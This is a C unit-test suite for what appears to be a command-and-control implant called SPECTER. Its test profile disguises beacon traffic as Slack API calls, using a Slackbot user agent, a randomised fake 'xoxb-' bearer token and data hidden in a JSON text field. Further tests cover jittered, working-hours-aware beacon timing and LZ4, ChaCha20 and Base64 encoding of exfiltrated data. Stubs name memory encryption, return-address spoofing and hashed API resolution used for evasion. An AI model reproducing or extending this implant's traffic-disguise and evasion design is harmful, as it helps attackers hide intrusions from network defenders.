/**
 * SPECTER Implant — Profile & Transform Test Suite
 *
 * Tests TLV profile parsing, URI rotation, header building,
 * data embedding/extraction, base64 encode/decode, LZ4 compress/
 * decompress, and transform chain roundtrip.
 *
 * Build (native, not PIC):
 *   gcc -o test_profile test_profile.c ../core/src/profile.c \
 *       ../core/src/transform.c ../core/src/crypto.c \
 *       ../core/src/string.c ../core/src/hash.c ../core/src/sleep.c \
 *       -I../core/include -DTEST_BUILD -Wno-unused-function
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include "specter.h"
#include "profile.h"
#include "transform.h"
#include "sleep.h"

/* ------------------------------------------------------------------ */
/* Additional NTSTATUS codes needed by tests                            */
/* ------------------------------------------------------------------ */

#ifndef STATUS_UNSUCCESSFUL
#define STATUS_UNSUCCESSFUL         ((NTSTATUS)0xC0000001)
#endif
#ifndef STATUS_INVALID_PARAMETER
#define STATUS_INVALID_PARAMETER    ((NTSTATUS)0xC000000D)
#endif
#ifndef STATUS_BUFFER_TOO_SMALL
#define STATUS_BUFFER_TOO_SMALL     ((NTSTATUS)0xC0000023)
#endif

/* ------------------------------------------------------------------ */
/* Globals and stubs needed by linked object files                      */
/* ------------------------------------------------------------------ */

IMPLANT_CONTEXT g_ctx;

PPEB get_peb(void) { return NULL; }
PVOID find_module_by_hash(DWORD hash) { (void)hash; return NULL; }
PVOID find_export_by_hash(PVOID base, DWORD hash) { (void)base; (void)hash; return NULL; }
PVOID resolve_function(DWORD mh, DWORD fh) { (void)mh; (void)fh; return NULL; }

/* spec_x25519_generate_keypair and spec_decrypt_string provided by crypto.c */

/* Stub for comms_get_profile_ptr (used by sleep.c) */
PROFILE_CONFIG *comms_get_profile_ptr(PVOID comms_ctx) {
    (void)comms_ctx;
    return NULL;
}

/* Stubs for syscall wrappers used by sleep.c */
NTSTATUS spec_NtDelayExecution(BOOL alertable, PVOID delay) {
    (void)alertable; (void)delay; return STATUS_SUCCESS;
}
NTSTATUS spec_NtProtectVirtualMemory(HANDLE h, PVOID *b, PSIZE_T s, ULONG p, PULONG o) {
    (void)h; (void)b; (void)s; (void)p; (void)o; return STATUS_SUCCESS;
}

/* Evasion stubs */
NTSTATUS memguard_encrypt(PVOID ectx) { (void)ectx; return STATUS_SUCCESS; }
NTSTATUS memguard_decrypt(PVOID ectx) { (void)ectx; return STATUS_SUCCESS; }
void memguard_setup_return_spoof(PVOID ectx) { (void)ectx; }

/* Config stub */
#include "config.h"
IMPLANT_CONFIG *cfg_get(IMPLANT_CONTEXT *ctx) { (void)ctx; return NULL; }
NTSTATUS cfg_init(IMPLANT_CONTEXT *ctx) { (void)ctx; return STATUS_SUCCESS; }
NTSTATUS cfg_update(IMPLANT_CONTEXT *ctx, const BYTE *data, DWORD len) { (void)ctx; (void)data; (void)len; return STATUS_SUCCESS; }
NTSTATUS cfg_encrypt(IMPLANT_CONTEXT *ctx) { (void)ctx; return STATUS_SUCCESS; }
NTSTATUS cfg_decrypt(IMPLANT_CONTEXT *ctx) { (void)ctx; return STATUS_SUCCESS; }
BOOL cfg_check_killdate(IMPLANT_CONTEXT *ctx) { (void)ctx; return FALSE; }

/* ------------------------------------------------------------------ */
/* Test framework                                                       */
/* ------------------------------------------------------------------ */

static int g_tests_passed = 0;
static int g_tests_failed = 0;

#define ASSERT(cond, msg) do { \
    if (!(cond)) { \
        printf("  FAIL: %s (line %d)\n", msg, __LINE__); \
        g_tests_failed++; \
    } else { \
        g_tests_passed++; \
    } \
} while(0)

/* ------------------------------------------------------------------ */
/* TLV blob builder helpers                                             */
/* ------------------------------------------------------------------ */

static void tlv_string(BYTE **buf, BYTE fid, const char *s) {
    WORD len = (WORD)strlen(s);
    **buf = fid; (*buf)++;
    (*buf)[0] = (BYTE)(len); (*buf)[1] = (BYTE)(len >> 8); (*buf) += 2;
    memcpy(*buf, s, len); *buf += len;
}

static void tlv_bytes_w(BYTE **buf, BYTE fid, const BYTE *data, WORD len) {
    **buf = fid; (*buf)++;
    (*buf)[0] = (BYTE)(len); (*buf)[1] = (BYTE)(len >> 8); (*buf) += 2;
    memcpy(*buf, data, len); *buf += len;
}

static void tlv_u8(BYTE **buf, BYTE fid, BYTE val) {
    tlv_bytes_w(buf, fid, &val, 1);
}

static void tlv_u16_w(BYTE **buf, BYTE fid, WORD val) {
    BYTE d[2] = { (BYTE)val, (BYTE)(val >> 8) };
    tlv_bytes_w(buf, fid, d, 2);
}

static void tlv_u64_w(BYTE **buf, BYTE fid, QWORD val) {
    BYTE d[8];
    for (int i = 0; i < 8; i++) d[i] = (BYTE)(val >> (i*8));
    tlv_bytes_w(buf, fid, d, 8);
}

static void tlv_embed_point(BYTE **buf, BYTE fid, BYTE loc, BYTE enc, const char *name) {
    BYTE ep[128];
    DWORD elen = 0;
    ep[elen++] = loc;
    ep[elen++] = enc;
    BYTE nlen = (BYTE)strlen(name);
    ep[elen++] = nlen;
    memcpy(ep + elen, name, nlen);
    elen += nlen;
    tlv_bytes_w(buf, fid, ep, (WORD)elen);
}

/* Build a test profile TLV blob */
static DWORD build_test_profile(BYTE *blob, DWORD blob_size) {
    BYTE *p = blob;

    tlv_string(&p, 0x01, "test-profile");

    /* HTTP request */
    tlv_string(&p, 0x20, "POST");
    tlv_string(&p, 0x21, "/api/chat.postMessage");
    tlv_string(&p, 0x21, "/api/conversations.history");
    tlv_string(&p, 0x21, "/api/users.info");
    tlv_string(&p, 0x22, "Content-Type: application/json");
    tlv_string(&p, 0x22, "User-Agent: Slackbot 1.0");
    tlv_string(&p, 0x22, "Authorization: Bearer xoxb-{{random_hex(8)}}");
    tlv_string(&p, 0x23, "{\"channel\":\"C12345\",\"text\":\"{{data}}\",\"as_user\":true}");
    tlv_embed_point(&p, 0x24, 0, 0, "text");  /* JsonField, Base64 */

    /* HTTP response */
    tlv_u16_w(&p, 0x30, 200);
    tlv_string(&p, 0x31, "Content-Type: application/json");
    tlv_string(&p, 0x32, "{\"ok\":true,\"message\":{\"text\":\"{{data}}\"}}");
    tlv_embed_point(&p, 0x33, 0, 0, "text");  /* JsonField, Base64 */
    tlv_u16_w(&p, 0x34, 200); /* 2% error rate */

    /* URI rotation */
    tlv_u8(&p, 0x35, 1); /* Random */

    /* Timing */
    tlv_u64_w(&p, 0x40, 30);     /* 30 seconds */
    tlv_u8(&p, 0x41, 1);         /* Gaussian */
    tlv_u16_w(&p, 0x42, 2500);   /* 25% */

    /* Working hours: Mon-Fri 8-18, off_hours_mult=4.0 (400) */
    {
        BYTE wh[5] = { 8, 18, 0x1F, 0x90, 0x01 }; /* 0x190 = 400 LE */
        tlv_bytes_w(&p, 0x43, wh, 5);
    }

    /* Initial delay */
    tlv_u64_w(&p, 0x45, 120);

    /* Transform */
    tlv_u8(&p, 0x50, 1);  /* LZ4 */
    tlv_u8(&p, 0x51, 0);  /* ChaCha20-Poly1305 */
    tlv_u8(&p, 0x52, 0);  /* Base64 */

    (void)blob_size;
    return (DWORD)(p - blob);
}

/* ------------------------------------------------------------------ */
/* Tests                                                                */
/* ------------------------------------------------------------------ */

static void test_profile_init(void) {
    printf("Test: profile_init (TLV parsing)\n");

    BYTE blob[4096];
    DWORD blob_len = build_test_profile(blob, sizeof(blob));
    ASSERT(blob_len > 0, "blob built");

    PROFILE_CONFIG cfg;
    NTSTATUS status = profile_init(blob, blob_len, &cfg);
    ASSERT(NT_SUCCESS(status), "profile_init returns success");
    ASSERT(cfg.initialized == TRUE, "profile marked initialized");

    ASSERT(spec_strcmp(cfg.name, "test-profile") == 0, "profile name parsed");
    ASSERT(spec_strcmp(cfg.request.method, "POST") == 0, "HTTP method parsed");
    ASSERT(cfg.request.uri_count == 3, "3 URI patterns parsed");
    ASSERT(spec_strcmp(cfg.request.uri_patterns[0], "/api/chat.postMessage") == 0, "first URI correct");
    ASSERT(cfg.request.header_count == 3, "3 headers parsed");
    ASSERT(cfg.request.embed_count == 1, "1 embed point parsed");
    ASSERT(cfg.request.embed_points[0].location == 0, "embed location = JsonField");
    ASSERT(cfg.request.embed_points[0].encoding == 0, "embed encoding = Base64");
    ASSERT(spec_strcmp(cfg.request.embed_points[0].field_name, "text") == 0, "embed field name");

    ASSERT(cfg.response.status_code == 200, "response status code");
    ASSERT(cfg.response.embed_count == 1, "response embed count");

    ASSERT(cfg.uri_rotation == 1, "URI rotation = Random");

    ASSERT(cfg.timing.callback_interval == 30, "callback interval = 30s");
    ASSERT(cfg.timing.jitter_distribution == 1, "jitter = Gaussian");
    ASSERT(cfg.timing.jitter_pct_100 == 2500, "jitter percent = 25%");
    ASSERT(cfg.timing.has_working_hours == TRUE, "has working hours");
    ASSERT(cfg.timing.working_hours.start_hour == 8, "working hours start = 8");
    ASSERT(cfg.timing.working_hours.end_hour == 18, "working hours end = 18");
    ASSERT(cfg.timing.working_hours.day_mask == 0x1F, "day mask = Mon-Fri");
    ASSERT(cfg.timing.working_hours.off_hours_mult_100 == 400, "off-hours mult = 4.0x");
    ASSERT(cfg.timing.initial_delay == 120, "initial delay = 120s");

    ASSERT(cfg.transform.compress == 1, "compress = LZ4");
    ASSERT(cfg.transform.encrypt == 0, "encrypt = ChaCha20-Poly1305");
    ASSERT(cfg.transform.encode == 0, "encode = Base64");
}

static void test_profile_init_invalid(void) {
    printf("Test: profile_init (invalid inputs)\n");

    PROFILE_CONFIG cfg;
    ASSERT(!NT_SUCCESS(profile_init(NULL, 0, &cfg)), "NULL blob fails");
    ASSERT(!NT_SUCCESS(profile_init((BYTE*)"x", 0, &cfg)), "zero-length blob fails");
    ASSERT(!NT_SUCCESS(profile_init((BYTE*)"x", 1, NULL)), "NULL output fails");
}

static void test_uri_rotation_sequential(void) {
    printf("Test: URI rotation (sequential)\n");

    BYTE blob[4096];
    DWORD blob_len = build_test_profile(blob, sizeof(blob));
    PROFILE_CONFIG cfg;
    profile_init(blob, blob_len, &cfg);
    cfg.uri_rotation = 0; /* Sequential */
    cfg.uri_index = 0;

    const char *u1 = profile_get_uri(&cfg);
    ASSERT(spec_strcmp(u1, "/api/chat.postMessage") == 0, "first URI");
    const char *u2 = profile_get_uri(&cfg);
    ASSERT(spec_strcmp(u2, "/api/conversations.history") == 0, "second URI");
    const char *u3 = profile_get_uri(&cfg);
    ASSERT(spec_strcmp(u3, "/api/users.info") == 0, "third URI");
    /* Sequential stays on last */
    const char *u4 = profile_get_uri(&cfg);
    ASSERT(spec_strcmp(u4, "/api/users.info") == 0, "stays on last URI");
}

static void test_uri_rotation_roundrobin(void) {
    printf("Test: URI rotation (round-robin)\n");

    BYTE blob[4096];
    DWORD blob_len = build_test_profile(blob, sizeof(blob));
    PROFILE_CONFIG cfg;
    profile_init(blob, blob_len, &cfg);
    cfg.uri_rotation = 2; /* RoundRobin */
    cfg.uri_index = 0;

    const char *u1 = profile_get_uri(&cfg);
    ASSERT(spec_strcmp(u1, "/api/chat.postMessage") == 0, "rr: first");
    const char *u2 = profile_get_uri(&cfg);
    ASSERT(spec_strcmp(u2, "/api/conversations.history") == 0, "rr: second");
    const char *u3 = profile_get_uri(&cfg);
    ASSERT(spec_strcmp(u3, "/api/users.info") == 0, "rr: third");
    const char *u4 = profile_get_uri(&cfg);
    ASSERT(spec_strcmp(u4, "/api/chat.postMessage") == 0, "rr: wraps to first");
}

static void test_profile_build_headers(void) {
    printf("Test: profile_build_headers\n");

    BYTE blob[4096];
    DWORD blob_len = build_test_profile(blob, sizeof(blob));
    PROFILE_CONFIG cfg;
    profile_init(blob, blob_len, &cfg);

    profile_test_set_prng_seed(12345);

    char headers[4096];
    DWORD hlen = profile_build_headers(&cfg, headers, sizeof(headers));
    ASSERT(hlen > 0, "headers built");

    /* Check that Content-Type header is present */
    ASSERT(strstr(headers, "Content-Type: application/json\r\n") != NULL,
           "Content-Type header present");
    ASSERT(strstr(headers, "User-Agent: Slackbot 1.0\r\n") != NULL,
           "User-Agent header present");
    /* Authorization header should have random hex expanded */
    ASSERT(strstr(headers, "Authorization: Bearer xoxb-") != NULL,
           "Authorization header with expanded random_hex");
}

static void test_profile_embed_extract_json(void) {
    printf("Test: profile_embed_data + profile_extract_data (JSON)\n");

    BYTE blob[4096];
    DWORD blob_len = build_test_profile(blob, sizeof(blob));
    PROFILE_CONFIG cfg;
    profile_init(blob, blob_len, &cfg);

    /* Test data */
    const BYTE test_data[] = "Hello, SPECTER!";
    DWORD test_len = (DWORD)strlen((char *)test_data);

    /* Embed */
    BYTE body[4096];
    DWORD body_len = profile_embed_data(&cfg, test_data, test_len, body, sizeof(body));
    ASSERT(body_len > 0, "embed produced output");

    /* The body should contain the JSON template */
    ASSERT(strstr((char *)body, "\"channel\":\"C12345\"") != NULL,
           "JSON channel field present");
    ASSERT(strstr((char *)body, "\"text\":\"") != NULL,
           "JSON text field present with embedded data");

    /* Extract using response profile — build a fake response */
    char *text_start = strstr((char *)body, "\"text\":\"");
    ASSERT(text_start != NULL, "found text field in embedded body");

    if (text_start) {
        text_start += 8; /* skip "text":" */
        char *text_end = strchr(text_start, '"');
        ASSERT(text_end != NULL, "found end of text field");

        if (text_end) {
            /* Build response with the same base64 data */
            char resp_body[4096];
            snprintf(resp_body, sizeof(resp_body),
                     "{\"ok\":true,\"message\":{\"text\":\"%.*s\"}}",
                     (int)(text_end - text_start), text_start);

            BYTE extracted[4096];
            DWORD extracted_len = 0;
            DWORD ret = profile_extract_data(&cfg, (BYTE *)resp_body,
                                              (DWORD)strlen(resp_body),
                                              extracted, &extracted_len);
            ASSERT(ret > 0, "extract produced output");
            ASSERT(extracted_len == test_len, "extracted length matches");
            ASSERT(spec_memcmp(extracted, test_data, test_len) == 0,
                   "extracted data matches original");
        }
    }
}

static void test_profile_get_method(void) {
    printf("Test: profile_get_method\n");

    BYTE blob[4096];
    DWORD blob_len = build_test_profile(blob, sizeof(blob));
    PROFILE_CONFIG cfg;
    profile_init(blob, blob_len, &cfg);

    ASSERT(profile_get_method(&cfg) == 1, "POST method returns 1");

    spec_strcpy(cfg.request.method, "GET");
    ASSERT(profile_get_method(&cfg) == 0, "GET method returns 0");
}

static void test_lz4_roundtrip(void) {
    printf("Test: LZ4 compress/decompress roundtrip\n");

    const char *test_data = "AAAAAABBBBBBCCCCCCDDDDDD this is test data "
                            "with some repetition AAAAAABBBBBB end";
    DWORD test_len = (DWORD)strlen(test_data);

    BYTE compressed[4096];
    DWORD comp_len = lz4_compress((BYTE *)test_data, test_len,
                                   compressed, sizeof(compressed));
    ASSERT(comp_len > 0, "LZ4 compress succeeds");

    BYTE decompressed[4096];
    DWORD decomp_len = lz4_decompress(compressed, comp_len,
                                       decompressed, sizeof(decompressed));
    ASSERT(decomp_len == test_len, "decompressed length matches");
    ASSERT(spec_memcmp(decompressed, test_data, test_len) == 0,
           "decompressed data matches original");
}

static void test_lz4_small_input(void) {
    printf("Test: LZ4 compress/decompress small input\n");

    const BYTE small[] = { 0x41, 0x42, 0x43 };
    BYTE compressed[256];
    DWORD comp_len = lz4_compress(small, 3, compressed, sizeof(compressed));
    ASSERT(comp_len > 0, "small LZ4 compress succeeds");

    BYTE decompressed[256];
    DWORD decomp_len = lz4_decompress(compressed, comp_len,
                                       decompressed, sizeof(decompressed));
    ASSERT(decomp_len == 3, "small decompress length = 3");
    ASSERT(spec_memcmp(decompressed, small, 3) == 0, "small data matches");
}

static void test_transform_roundtrip_lz4_base64(void) {
    printf("Test: transform_send/recv roundtrip (LZ4 + ChaCha20 + Base64)\n");

    BYTE key[32];
    for (int i = 0; i < 32; i++) key[i] = (BYTE)(i + 1);

    TRANSFORM_CONFIG tcfg;
    spec_memset(&tcfg, 0, sizeof(tcfg));
    tcfg.compress = 1; /* LZ4 */
    tcfg.encrypt = 0;  /* ChaCha20-Poly1305 */
    tcfg.encode = 0;   /* Base64 */

    const char *plaintext = "Hello SPECTER C2 profile transform chain!";
    DWORD pt_len = (DWORD)strlen(plaintext);

    BYTE encoded[TRANSFORM_MAX_OUTPUT];
    DWORD encoded_len = 0;
    NTSTATUS status = transform_send((BYTE *)plaintext, pt_len, key, &tcfg,
                                      encoded, &encoded_len, sizeof(encoded));
    ASSERT(NT_SUCCESS(status), "transform_send succeeds");
    ASSERT(encoded_len > 0, "transform_send produced output");

    /* Verify output looks like base64 (printable chars) */
    BOOL all_printable = TRUE;
    for (DWORD i = 0; i < encoded_len; i++) {
        if (encoded[i] < 0x20 || encoded[i] > 0x7E) {
            all_printable = FALSE;
            break;
        }
    }
    ASSERT(all_printable, "base64 output is all printable");

    BYTE decoded[TRANSFORM_MAX_OUTPUT];
    DWORD decoded_len = 0;
    status = transform_recv(encoded, encoded_len, key, &tcfg,
                             decoded, &decoded_len, sizeof(decoded));
    ASSERT(NT_SUCCESS(status), "transform_recv succeeds");
    ASSERT(decoded_len == pt_len, "roundtrip length matches");
    ASSERT(spec_memcmp(decoded, plaintext, pt_len) == 0, "roundtrip data matches");
}

static void test_transform_roundtrip_no_compress(void) {
    printf("Test: transform_send/recv roundtrip (no compress, hex)\n");

    BYTE key[32];
    for (int i = 0; i < 32; i++) key[i] = (BYTE)(0xAA ^ i);

    TRANSFORM_CONFIG tcfg;
    spec_memset(&tcfg, 0, sizeof(tcfg));
    tcfg.compress = 0; /* None */
    tcfg.encrypt = 0;  /* ChaCha20-Poly1305 */
    tcfg.encode = 2;   /* Hex */

    const char *plaintext = "Short payload";
    DWORD pt_len = (DWORD)strlen(plaintext);

    BYTE encoded[TRANSFORM_MAX_OUTPUT];
    DWORD encoded_len = 0;
    NTSTATUS status = transform_send((BYTE *)plaintext, pt_len, key, &tcfg,
                                      encoded, &encoded_len, sizeof(encoded));
    ASSERT(NT_SUCCESS(status), "transform_send (hex) succeeds");

    BYTE decoded[TRANSFORM_MAX_OUTPUT];
    DWORD decoded_len = 0;
    status = transform_recv(encoded, encoded_len, key, &tcfg,
                             decoded, &decoded_len, sizeof(decoded));
    ASSERT(NT_SUCCESS(status), "transform_recv (hex) succeeds");
    ASSERT(decoded_len == pt_len, "hex roundtrip length matches");
    ASSERT(spec_memcmp(decoded, plaintext, pt_len) == 0, "hex roundtrip data matches");
}

static void test_transform_wrong_key(void) {
    printf("Test: transform_recv with wrong key fails\n");

    BYTE key1[32], key2[32];
    spec_memset(key1, 0x11, 32);
    spec_memset(key2, 0x22, 32);

    TRANSFORM_CONFIG tcfg;
    spec_memset(&tcfg, 0, sizeof(tcfg));
    tcfg.compress = 0;
    tcfg.encrypt = 0;
    tcfg.encode = 3; /* Raw */

    const char *plaintext = "Secret data";
    DWORD pt_len = (DWORD)strlen(plaintext);

    BYTE encoded[TRANSFORM_MAX_OUTPUT];
    DWORD encoded_len = 0;
    transform_send((BYTE *)plaintext, pt_len, key1, &tcfg,
                    encoded, &encoded_len, sizeof(encoded));

    BYTE decoded[TRANSFORM_MAX_OUTPUT];
    DWORD decoded_len = 0;
    NTSTATUS status = transform_recv(encoded, encoded_len, key2, &tcfg,
                                      decoded, &decoded_len, sizeof(decoded));
    ASSERT(!NT_SUCCESS(status), "wrong key causes decryption failure");
}

static void test_sleep_profile_jitter_uniform(void) {
    printf("Test: sleep_calc_profile_jitter (uniform)\n");

    TIMING_CONFIG timing;
    spec_memset(&timing, 0, sizeof(timing));
    timing.callback_interval = 60; /* 60 seconds */
    timing.jitter_distribution = 0; /* Uniform */
    timing.jitter_pct_100 = 2000;   /* 20% */
    timing.has_working_hours = FALSE;

    DWORD ms = sleep_calc_profile_jitter(&timing, 12, 2); /* Wed noon */
    /* Should be 60000 ± 20% = 48000..72000 */
    ASSERT(ms >= 40000 && ms <= 80000, "uniform jitter in expected range");
}

static void test_sleep_profile_jitter_gaussian(void) {
    printf("Test: sleep_calc_profile_jitter (gaussian)\n");

    TIMING_CONFIG timing;
    spec_memset(&timing, 0, sizeof(timing));
    timing.callback_interval = 30;
    timing.jitter_distribution = 1; /* Gaussian */
    timing.jitter_pct_100 = 2500;   /* 25% */
    timing.has_working_hours = FALSE;

    /* Run multiple times and check distribution is centered around 30000 */
    DWORD total = 0;
    for (int i = 0; i < 100; i++) {
        DWORD ms = sleep_calc_profile_jitter(&timing, 12, 2);
        total += ms;
        ASSERT(ms > 0 && ms <= 120000, "gaussian value in sane range");
    }
    DWORD avg = total / 100;
    ASSERT(avg > 20000 && avg < 40000, "gaussian average near 30000ms");
}

static void test_sleep_profile_working_hours(void) {
    printf("Test: sleep_calc_profile_jitter (working hours)\n");

    TIMING_CONFIG timing;
    spec_memset(&timing, 0, sizeof(timing));
    timing.callback_interval = 30;
    timing.jitter_distribution = 0; /* Uniform */
    timing.jitter_pct_100 = 0;      /* No jitter for easy testing */
    timing.has_working_hours = TRUE;
    timing.working_hours.start_hour = 8;
    timing.working_hours.end_hour = 18;
    timing.working_hours.day_mask = 0x1F; /* Mon-Fri */
    timing.working_hours.off_hours_mult_100 = 400; /* 4x */

    /* During working hours (Wed 12:00) */
    DWORD ms_work = sleep_calc_profile_jitter(&timing, 12, 2);
    ASSERT(ms_work == 30000, "working hours: base interval (30s)");

    /* Off-hours (Wed 22:00) */
    DWORD ms_off = sleep_calc_profile_jitter(&timing, 22, 2);
    ASSERT(ms_off == 120000, "off-hours: 4x multiplier (120s)");

    /* Weekend (Sat 12:00, dow=5) */
    DWORD ms_weekend = sleep_calc_profile_jitter(&timing, 12, 5);
    ASSERT(ms_weekend == 120000, "weekend: 4x multiplier (120s)");
}

/* ------------------------------------------------------------------ */
/* Main                                                                 */
/* ------------------------------------------------------------------ */

int main(void) {
    printf("=== SPECTER Profile & Transform Test Suite ===\n\n");

    test_profile_init();
    test_profile_init_invalid();
    test_uri_rotation_sequential();
    test_uri_rotation_roundrobin();
    test_profile_build_headers();
    test_profile_embed_extract_json();
    test_profile_get_method();
    test_lz4_roundtrip();
    test_lz4_small_input();
    test_transform_roundtrip_lz4_base64();
    test_transform_roundtrip_no_compress();
    test_transform_wrong_key();
    test_sleep_profile_jitter_uniform();
    test_sleep_profile_jitter_gaussian();
    test_sleep_profile_working_hours();

    printf("\n=== Results: %d passed, %d failed ===\n",
           g_tests_passed, g_tests_failed);

    return g_tests_failed > 0 ? 1 : 0;
}
